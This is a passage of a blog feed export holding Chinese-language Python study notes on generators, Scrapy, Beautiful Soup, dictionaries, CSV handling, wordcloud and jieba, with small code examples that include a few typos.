class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">生成器写法</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-keyword">yield</span> i**<span class="hljs-number">2</span><br>        <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> gen(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(i, <span class="hljs-string">&quot; &quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>  <br>---&gt;<span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">4</span>  <span class="hljs-number">9</span>  <span class="hljs-number">16</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">普通写法</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">square</span>(<span class="hljs-params">n</span>):<br>    ls = [i**<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)]<br>    <span class="hljs-keyword">return</span> ls<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> square(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(i, <span class="hljs-string">&quot; &quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br>---&gt;<span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">4</span>  <span class="hljs-number">9</span>  <span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><ul><li>生成器的优点：<ul><li><strong>节省存储空间</strong></li><li>响应更迅速</li><li>使用更灵活</li></ul></li></ul><h3 id="scrapy爬虫的使用步骤">scrapy爬虫的使用步骤</h3><p>:one:创建一个工程和spider模板</p><p>:two:编写spider</p><p>:three:编写item piprline</p><p>:four:优化配置策略</p><h3 id="scrapy爬虫的数据类型">scrapy爬虫的数据类型</h3><h5 id="requests类">requests类</h5><ul><li>class scrapy.http.Request()</li><li>Request对象表示一个HTTP请求（request库中的相似）</li><li>由spider生成，由downloader执行</li></ul><table><thead><tr><th>属性或方法</th><th>说明</th></tr></thead><tbody><tr><td>.url</td><td>request对应的请求URL地址</td></tr><tr><td>.method</td><td>对应的请求方法，’GET‘ ’POST‘等</td></tr><tr><td>.headers</td><td>字典类型风格的请求头</td></tr><tr><td>.body</td><td>请求内容主题，字符串类型</td></tr><tr><td>.meta</td><td>用户添加的扩展信息，在scrapy内部模块间传递信息使用</td></tr><tr><td>.copy()</td><td>复制该请求</td></tr></tbody></table><h5 id="response类">response类</h5><p>class scrapy.http.Response()</p><ul><li>Response对象表示一个HTTP响应</li><li>由downloader生成，由spider处理</li></ul><table><thead><tr><th>属性或方法</th><th>说明</th></tr></thead><tbody><tr><td>.url</td><td>Response对应的URL地址</td></tr><tr><td>.status</td><td>HTTP状态码，默认是200</td></tr><tr><td>.headers</td><td>Response对应的头部信息</td></tr><tr><td>.body</td><td>Response对应的内容信息，字符串类型</td></tr><tr><td>.flags</td><td>一组标记</td></tr><tr><td>.request</td><td>产生Response类型对应的Request对象</td></tr><tr><td>.copy()</td><td>复制该响应</td></tr></tbody></table><h5 id="item类">item类</h5><p>class scrapy.item.Item()</p><ul><li>Item对象表示一个HTML页面中提取的信息内容</li><li>由spider生成，由Item Pipeline处理</li><li>类似字典类型，可以按照字典类型操作</li></ul><h3 id="另一种HTML页面的信息提取方法-CSS-Selector">另一种HTML页面的信息提取方法:CSS Selector</h3><p>&lt; HTML&gt;.css(‘a::attr(href)’).extract( )</p><h3 id="配置并发连接选项">配置并发连接选项</h3><p>settings.py文件</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>CONCURRNET_REQUESTS</td><td>downloader最大请求下载输俩个,默认32</td></tr><tr><td>CONCURRENT_ITEMS</td><td>Item Pipeline最大的ITEM处理数量,默认100</td></tr><tr><td>CONCURRENT_REQUESTS_PER_DOMAIN</td><td>每个目标域名最大的并发请求数量,默认8</td></tr><tr><td>CONCURRNET_REQUESTS_PER_IP</td><td>每个目标IP最大的并发请求数量,默认0,非0有效</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>3-Beautiful Soup库</title>
    <link href="/2022/02/16/%E7%88%AC%E8%99%AB3Beautiful%20Soup%E5%BA%93/"/>
    <url>/2022/02/16/%E7%88%AC%E8%99%AB3Beautiful%20Soup%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h3 id="Beautiful-Soup库">Beautiful Soup库</h3><ul><li><p>能够解析html和xml文件的功能库</p></li><li><p>解析、遍历、维护“标签树”的功能库</p></li><li><p>亦称为beautifulsoup4或bs4</p></li><li><p>最常用的引用方式：from  bs4  import  BeautifulSoup</p></li><li><p>一般可以认为HTML文档、标签树、BeautifulSoup类三者等价，BeautifulSoup对应一个HTML/XML文档的全部内容</p></li><li><p>bs4将任何读入的html文件或字符串都转换成了utf-8编码</p></li><li><p>标签</p><ul><li>&lt; p &gt;…&lt; /p &gt;：标签Tag</li><li>&lt; p class=“title”&gt;…&lt; /p&gt;：p为名称（成对出现），其余为属性Attributes（0个或多个）</li></ul></li></ul><h3 id="Beautiful-Soup库解析器">Beautiful Soup库解析器</h3><table><thead><tr><th>解析器</th><th>使用方法</th><th>条件</th></tr></thead><tbody><tr><td>bs4的HTML解析器</td><td>BeautifulSoup(mk,‘html.parser’)</td><td>安装bs4库</td></tr><tr><td>lxml的HTML解析器</td><td>BeautifulSoup(mk,‘lxml’)</td><td>pip install lxml</td></tr><tr><td>lxml的XML解析器</td><td>BeautifulSoup(mk,‘xml’)</td><td>pip install lxml</td></tr><tr><td>html5lib的解析器</td><td>BeautifulSoup(mk,‘html5lib’)</td><td>pip install html5lib</td></tr></tbody></table><h3 id="Beautiful-Soup类的基本元素">Beautiful Soup类的基本元素</h3><table><thead><tr><th>基本元素</th><th>说明</th></tr></thead><tbody><tr><td>Tag</td><td>标签，最基本的信息组织元素，分别用&lt;&gt;和&lt;/&gt;标明开头和结尾</td></tr><tr><td>Name</td><td>标签的名字，&lt; p&gt;…&lt; /p&gt;的名字是“p”，格式：&lt; tag&gt;.name</td></tr><tr><td>Attribute</td><td>标签的属性，字典形式组织，格式：&lt; tag&gt;.attrs</td></tr><tr><td>NavigableString</td><td>标签内非属性字符串，&lt;&gt;…&lt; /&gt;中字符串，格式：&lt; tag&gt;.string</td></tr><tr><td>Comment</td><td>标签内字符串的注释部分，一种特殊的Comment类型</td></tr></tbody></table><h6 id="相关使用">相关使用</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>demo = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;html&gt;&lt;head&gt;&lt;title&gt;This is a python demo page&lt;/title&gt;&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;</span><br><span class="hljs-string">&lt;p class=&quot;course&quot;&gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:</span><br><span class="hljs-string">&lt;a href=&quot;http://www.icourse163.org/course/BIT-268001&quot; class=&quot;py1&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt; and &lt;a href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; class=&quot;py2&quot; id=&quot;link2&quot;&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;</span><br><span class="hljs-string">&lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>soup = BeautifulSoup(demo, <span class="hljs-string">&quot;html.parser&quot;</span>)<br><span class="hljs-built_in">print</span>(soup.title)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Tag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 获取链接标签</span><br>tag = soup.a<br><span class="hljs-built_in">print</span>(tag)<br><br><span class="hljs-comment"># 获得标签的名字</span><br><span class="hljs-built_in">print</span>(soup.a.name)<br><span class="hljs-comment"># a的父亲的名字(包含a标签的上一层标签)</span><br><span class="hljs-built_in">print</span>(soup.a.parent.name)<br><span class="hljs-built_in">print</span>(soup.a.parent.parent.name)<br><span class="hljs-comment"># 获得标签的属性信息</span><br><span class="hljs-built_in">print</span>(tag.attrs)  <span class="hljs-comment"># 字典格式</span><br><span class="hljs-comment"># 获得某个属性的信息</span><br><span class="hljs-built_in">print</span>(tag.attrs[<span class="hljs-string">&#x27;class&#x27;</span>])<br><span class="hljs-built_in">print</span>(tag.attrs[<span class="hljs-string">&#x27;href&#x27;</span>])  <span class="hljs-comment"># 获取链接属性</span><br><span class="hljs-comment"># 查看标签属性的类型</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(tag.attrs))  <span class="hljs-comment"># &lt;class &#x27;dict&#x27;&gt;,若无属性，字典为空</span><br><span class="hljs-comment"># 查看标签类型</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(tag))  <span class="hljs-comment"># &lt;class &#x27;bs4.element.Tag&#x27;&gt;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">NavigableString</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(soup.a.string)<br><span class="hljs-built_in">print</span>(soup.p)<br><span class="hljs-comment"># &lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;</span><br><span class="hljs-built_in">print</span>(soup.p.string)<br><span class="hljs-comment"># The demo python introduces several python courses.</span><br><span class="hljs-comment"># p标签中包含b标签，但是打印出来的并不含b标签，说明NavigableString可以跨越多个标签层次</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(soup.p.string))<br><span class="hljs-comment"># &lt;class &#x27;bs4.element.NavigableString&#x27;&gt;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Comment</span><br><span class="hljs-string">使用.string时不能判断是否为注释,需要用类型判断</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>newsoup = BeautifulSoup(<span class="hljs-string">&quot;&lt;b&gt;&lt;!--this is a comment--&gt;&lt;/b&gt;&lt;p&gt;this is not a comment&lt;/p&gt;&quot;</span>, <span class="hljs-string">&quot;html.parser&quot;</span>)<br><span class="hljs-built_in">print</span>(newsoup.b.string)<br><span class="hljs-comment"># this is a comment</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(newsoup.b.string))<br><span class="hljs-comment"># &lt;class &#x27;bs4.element.Comment&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(newsoup.p.string)<br><span class="hljs-comment"># this is not a comment</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(newsoup.p.string))<br><span class="hljs-comment"># &lt;class &#x27;bs4.element.NavigableString&#x27;&gt;</span><br></code></pre></td></tr></table></figure><h3 id="标签树的遍历">标签树的遍历</h3><ul><li>下行遍历</li></ul><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.contents</td><td>子节点的列表，将&lt; tag&gt;所有儿子节点存入列表</td></tr><tr><td>.children</td><td>子节点的迭代类型，与.contents类似，用于循环遍历儿子节点</td></tr><tr><td>.descendants</td><td>子孙节点的迭代类型，包含所有子孙节点，用于循环遍历</td></tr></tbody></table><ul><li>上行遍历</li></ul><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.parent</td><td>节点的父亲节点</td></tr><tr><td>.parents</td><td>节点先辈标签的迭代类型，用于循环遍历先辈节点</td></tr></tbody></table><ul><li><p>平行遍历</p><p>条件：所有的平行遍历必须发生在同一个父亲节点下</p><p>标签之间的NavigableString也构成标签树的节点</p></li></ul><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.next_sibling</td><td>返回按照HTML文本顺序的下一个平行点标签</td></tr><tr><td>.previous_sibling</td><td>返回按照HTML文本顺序的上一个平行点标签</td></tr><tr><td>.next_siblings</td><td>迭代类型，返回按照HTML文本顺序的后续所有平行点标签</td></tr><tr><td>.previous_siblings</td><td>迭代类型，返回按照HTML文本顺序的前续所有平行点标签</td></tr></tbody></table><h3 id="显示">显示</h3><p>使用prettify( )：增加换行符等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">soup = BeautifulSoup(demo, <span class="hljs-string">&quot;html.parser&quot;</span>)<br><span class="hljs-built_in">print</span>(soup.prettify())<br><span class="hljs-built_in">print</span>(soup.a.prettify())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>字典</title>
    <link href="/2022/02/16/%E5%AD%97%E5%85%B8/"/>
    <url>/2022/02/16/%E5%AD%97%E5%85%B8/</url>
    
    <content type="html"><![CDATA[<h3 id="字典类型的定义">字典类型的定义{}</h3><ul><li><p>键值对：键是数据索引的扩展</p></li><li><p>字典是键值对的集合，键值对之间无序</p></li><li><p>创建：{}、dict()，键值对的对应用：表示</p></li><li><p>[ ]用来向字典变量中<strong>索引</strong>或<strong>增加</strong>元素：d[key]</p></li><li><p>d={‘x’:‘y’}</p><p>d[‘x’]=y</p></li></ul><h3 id="注意">注意</h3><ul><li>键是唯一的，值是允许重复的</li><li>没有下标和切片</li><li>添加/修改：dict1[key]=value    注意：key是唯一的，所以在添加的时候如果出现同名     key，后面key对应的value则替换原来的</li></ul><h3 id="操作函数和方法">操作函数和方法</h3><ul><li>del d[k]       删除字典d中<strong>键k对应的</strong>数据值</li><li>k in d           判断</li><li>d.keys()       返回d中<strong>所有</strong>的<strong>键</strong>信息</li><li>d.values()    返回d中<strong>所有</strong>的<strong>值</strong>信息</li><li>d.items()      返回d中<strong>所有</strong>的<strong>键值对</strong>信息</li><li><strong>d.get</strong>(k , <default>)     键k存在，则<strong>返回</strong>相应值，不存在则返回<default>值，默认返回None</li><li>d.pop(k , <default>)   键k存在，则<strong>取出</strong>相应值，不存在则返回<default>值</li><li>d.popitem()                     默认<strong>从后往前</strong>删除一个<strong>键值对</strong>，以<strong>元组</strong>形式返回</li><li>d.clear()                           删除<strong>所有</strong>的<strong>键值对</strong></li><li>d.len(d)                            返回d中的<strong>元素个数</strong></li><li>d.setdefault(‘key’ , ‘value’ )  添加</li><li>d.update(d2)                   合并，不能用相加</li></ul><h3 id="应用">应用</h3><ul><li><p>映射的表达</p></li><li><p>元素遍历</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-comment"># 直接遍历，得到的是key</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d.values():<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d.keys():<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d.items():<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>Python基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一二维数据的格式化处理</title>
    <link href="/2022/02/16/%E4%B8%80%E4%BA%8C%E7%BB%B4%E6%95%B0%E6%8D%AE%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86/"/>
    <url>/2022/02/16/%E4%B8%80%E4%BA%8C%E7%BB%B4%E6%95%B0%E6%8D%AE%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h3 id="一维数据的格式化处理">一维数据的格式化处理</h3><ul><li>从空格分隔的文件中读入数据：split()</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">txt = <span class="hljs-built_in">open</span>(filename).read()<br>ls = txt.split()  <span class="hljs-comment"># 特殊符号分隔用txt.split(&quot;&amp;&quot;)等</span><br>f.close()<br></code></pre></td></tr></table></figure><ul><li>采用空格分隔符方式写入文件：join()</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">ls = [<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>]<br>f.<span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27; &#x27;</span>.join(ls))<br>f.close()<br></code></pre></td></tr></table></figure><h3 id="二维数据的格式化和处理">二维数据的格式化和处理</h3><ul><li>CSV：Comma-Separated Values<ul><li>国际通用的一二维数据存储格式，一般.CSV为扩展名</li><li>每行一个一维数据，采用逗号分隔，无空行</li><li>Excel和一般编辑软件都可以读入或另存为csv文件</li><li>如果某个元素缺失，逗号仍然要保留</li><li>二维数据的表头可以作为数据存储，也可以另行存储</li><li>逗号为英文半角逗号，逗号与数据之间无额外空格</li></ul></li><li>从CSV格式的文件中读入数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">file = <span class="hljs-built_in">open</span>(filename)<br>ls = []<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>line =line.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)  <span class="hljs-comment"># 每行一般以换行符结尾</span><br>ls.append(line.split(<span class="hljs-string">&quot;,&quot;</span>))<br><br>file.close()<br></code></pre></td></tr></table></figure><ul><li>将数据写入CSV格式的文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">ls = [[],[],[]]  <span class="hljs-comment"># 二维列表</span><br>file = <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> ls:<br>f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(item)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>file.close()<br></code></pre></td></tr></table></figure><ul><li>逐一遍历</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">ls = [[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">4</span>],[<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]]<br><br><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> ls:<br><span class="hljs-keyword">for</span> column <span class="hljs-keyword">in</span> row:<br><span class="hljs-built_in">print</span>(column)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>wordcloud</title>
    <link href="/2022/02/16/wordcloud/"/>
    <url>/2022/02/16/wordcloud/</url>
    
    <content type="html"><![CDATA[<h2 id="wordcloud-cloud">wordcloud:cloud:</h2><h6 id="概念">概念</h6><ul><li>wordcloud库把词云当作一个WordCloud对象</li><li>可以根据文本中词语出现的频率等参数绘制词云</li><li>词云的绘制形状、尺寸和颜色都可以设定</li></ul><h6 id="文本-词云">文本-----&gt;词云</h6><p>:one:分隔：以空格分隔单词</p><p>:two:统计：统计单词出现次数并过滤</p><p>:three:根据统计配置字号</p><p>:four:颜色环境尺寸</p><h6 id="步骤">步骤</h6><p>:one:配置对象参数</p><p>:two:加载词云文本</p><p>:three:输出词云文件</p><h6 id="常规方法">常规方法</h6><p>:one:w.generate(txt)：向WordCloud对象w中加载文本txt</p><p>:two:w.to_file(filename)：将词云输出为图像文件，.png或.jpg格式</p><h6 id="参数设置w-wordcloud-WordCloud-参数">参数设置w=wordcloud.WordCloud(&lt;参数&gt;)</h6><p>:one:width：默认400像素</p><p>:two:height：默认200像素</p><p>:three:min_front_size：词云字体的最小字号，默认4号</p><p>:four:max_front_size：根据高度自动调节</p><p>:five:font_step：指定词云中字体字号的步进间隔，默认为1</p><p>:six:font_path：指定字体文件的路径，默认None（msyh.ttc：微软雅黑）</p><p>:seven:max_words：指定词云显示最大单词数量，默认200</p><p>:eight:stop_words：指定词云的排除词列表，即不显示的单词列表</p><p>:nine:mask：指定词云形状，默认为长方形，需要引用imread()函数（from scipy.misc import imread)</p><p>:one::zero:background_color：背景颜色，默认为黑色</p><h6 id="简单使用">简单使用</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> wordcloud<br><br>c = wordcloud.WordCloud()<br>c.generate(<span class="hljs-string">&quot;wordcloud by python&quot;</span>)<br>c.to_file(<span class="hljs-string">&quot;pywordcloud.png&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2022/02/16/wordcloud/5.jpg" class=""><p>:small_blue_diamond:默认宽400像素高200像素</p><h6 id="中文词云">中文词云</h6><p>需要配合jieba库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jieba<br><span class="hljs-keyword">import</span> wordcloud<br><br>txt = <span class="hljs-string">&quot;程序设计语言是计算机能够理解和识别用户操作意图的一种交互体系， \</span><br><span class="hljs-string">      它按照特定规则组织计算机指令，使计算机能够自动进行各种运算处理&quot;</span><br><br>w = wordcloud.WordCloud(width=<span class="hljs-number">1000</span>, font_path=<span class="hljs-string">&quot;msyh.ttc&quot;</span>, height=<span class="hljs-number">700</span>)<br>w.generate(<span class="hljs-string">&quot; &quot;</span>.join(jieba.lcut(txt)))<br>w.to_file(<span class="hljs-string">&quot;pywcloud2.png&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2022/02/16/wordcloud/6.jpg" class=""><h6 id="实例">实例</h6><ul><li><p>政府工作报告词云</p><ul><li><p>步骤</p><p>读取文件、分词整理</p><p>设置并输出词云</p><p>观察结果，优化迭代</p></li></ul></li><li><p>词云形状</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scipy.misc <span class="hljs-keyword">import</span> imread<br>mask = imread(<span class="hljs-string">&quot;图片形状路径&quot;</span>)<br>w = wprdccloud.WordCloud(...,mask=mask,...)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jieba库</title>
    <link href="/2022/02/16/jieba%E5%BA%93/"/>
    <url>/2022/02/16/jieba%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h3 id="概述">概述</h3><p>jieba库：中文分词第三方库</p><h3 id="分词原理">分词原理</h3><ul><li>利用一个中文词库，确定中文字符之间的关联概率</li><li>中文字符间概率大的词组成词组，形成分词结果</li><li>可以自定义词组</li></ul><h3 id="模式分类">模式分类</h3><ul><li>精确模式：把文本精确的切分开，不存在冗余单词</li><li>全模式：把文本中所有的可能词语都扫描出来，有冗余</li><li>搜索引擎模式：在精确模式基础上，对长词再次切分</li></ul><h3 id="常用函数">常用函数</h3><p>jieba.lcut(s):<strong>精确模式</strong>，返回一个列表类型的分词结果</p><p>jieba.lcut(s, cut_all=True):<strong>全模式</strong>，返回一个列表类型的分词结果，存在冗余</p><p>jieba.lcut_for_search(s):<strong>搜索引擎模式</strong>，返回一个列表类型的分词结果，存在冗余</p><p>jieba.add_word(w):向分词词典<strong>增加新词</strong>w</p><h3 id="实例">实例</h3><ul><li><p>Hamlet英文词频统计</p><ul><li>读取文件</li><li>统一大小写（全部转换成小写）</li><li>处理特殊字符</li><li>得到初步处理后的文本</li><li>分词（英文则以空格为切分依据）</li><li>根据对应关系创建字典</li><li>用sort/sorted排序</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getText</span>():<br>    txt = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\python\学习资料\文本/hamlet.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read() <span class="hljs-comment"># 读取文件内容</span><br>    txt = txt.lower()  <span class="hljs-comment"># 全部转化为小写字母</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;!&quot;#$%&amp;()*+,-./:;&lt;=&gt;?@[\\]^_‘&#123;|&#125;~&#x27;</span>:<br>        txt = txt.replace(ch, <span class="hljs-string">&quot; &quot;</span>)  <span class="hljs-comment"># 将文本中特殊字符替换为空格</span><br>    <span class="hljs-keyword">return</span> txt<br><br><br>hamletTxt = getText()<br>words = hamletTxt.split()  <span class="hljs-comment"># 切分，分隔符为空字符（空格），返回列表</span><br>counts = &#123;&#125;  <span class="hljs-comment"># 字典类型</span><br><span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:  <span class="hljs-comment"># 计数</span><br>    counts[word] = counts.get(word, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span><br>items = <span class="hljs-built_in">list</span>(counts.items())  <span class="hljs-comment"># 将字典转化成列表类型，字典的每对键值对转换成一个元组作为列表的一个元素</span><br>items.sort(key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 使用列表的排序方法，x为每个小的元素，x[1]表示小的元素的第二个字段，并以此为排序依据(对应为该例中的频数)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):  <span class="hljs-comment"># 打印前十个</span><br>    word, count = items[i]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;</span>.<span class="hljs-built_in">format</span>(word, count))<br></code></pre></td></tr></table></figure><img src="/2022/02/16/jieba%E5%BA%93/jieba1.jpg" class=""></li><li><p>《三国演义》人物出场次数统计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 